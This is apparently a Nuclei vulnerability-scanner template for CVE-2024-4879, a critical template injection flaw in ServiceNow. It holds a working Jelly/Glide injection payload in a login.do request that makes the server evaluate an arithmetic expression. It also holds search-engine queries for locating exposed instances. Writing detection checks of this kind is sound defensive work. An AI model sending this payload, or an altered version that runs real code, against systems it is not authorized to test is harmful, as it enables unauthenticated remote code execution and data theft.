id: CVE-2024-4879

info:
  name: ServiceNow UI Macros - Template Injection
  author: DhiyaneshDk,ritikchaddha
  severity: critical
  description: |
    ServiceNow has addressed an input validation vulnerability that was identified in Vancouver and Washington DC Now Platform releases. This vulnerability could enable an unauthenticated user to remotely execute code within the context of the Now Platform.Â ServiceNow applied an update to hosted instances, and ServiceNow released the update to our partners and self-hosted customers. Listed below are the patches and hot fixes that address the vulnerability. If you have not done so already, we recommend applying security patches relevant to your instance as soon as possible.
  reference:
    - https://www.assetnote.io/resources/research/chaining-three-bugs-to-access-all-your-servicenow-data
    - https://support.servicenow.com/kb?id=kb_article_view&sysparm_article=KB1644293
    - https://support.servicenow.com/kb?id=kb_article_view&sysparm_article=KB1645154
    - https://nvd.nist.gov/vuln/detail/CVE-2024-4879
  classification:
    epss-score: 0.94398
    epss-percentile: 0.9997
  metadata:
    verified: true
    max-request: 1
    vendor: servicenow
    product: servicenow
    shodan-query:
      - http.favicon.hash:"1701804003"
      - http.title:"servicenow"
    fofa-query:
      - icon_hash=1701804003
      - title="servicenow"
    google-query: intitle:"servicenow"
  tags: cve,cve2024,servicenow,ssti,kev,vkev

http:
  - raw:
      - |
        GET /login.do?jvar_page_title=<style><j:jelly%20xmlns:j="jelly"%20xmlns:g=%27glide%27><g:evaluate>gs.addErrorMessage(1337*1337);</g:evaluate></j:jelly></style> HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<div class="outputmsg_text">1787569</div>'

      - type: word
        part: header
        words:
          - 'text/html'

      - type: status
        status:
          - 200
# digest: 4a0a004730450221008ff2e8c60e6971b2a09586c8a52f586960f7be822de6adea0e7ebfcb00a69f1502201e0fc8bfbd51e4c50b10133f107f58d3d263311e7b67dd2f08af1f02fb9742d1:922c64590222798bb761d5b6d8e72950